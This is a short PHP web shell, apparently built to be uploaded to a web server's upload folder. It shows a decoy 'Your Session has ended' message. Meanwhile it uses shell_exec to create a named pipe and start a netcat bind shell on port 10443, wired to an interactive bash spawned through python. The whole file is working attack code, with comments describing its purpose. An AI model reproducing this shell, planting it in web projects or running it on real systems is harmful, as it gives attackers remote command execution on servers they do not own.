<?php
echo "<pre>";
echo "Your Session has ended.!";

// Backpipe is required to run this netcat shell / We will place it where we know we can write
echo shell_exec("mknod /var/www/html/upload/backpipe p");
// Create the ncat listener using a python spawned version of /bin/bash
echo shell_exec("/usr/bin/python -c 'import pty;pty.spawn(\"/bin/bash\")' 0</var/www/html/upload/backpipe | nc -l -p 10443 1>/var/www/html/upload/backpipe");

echo "</pre>";
?>

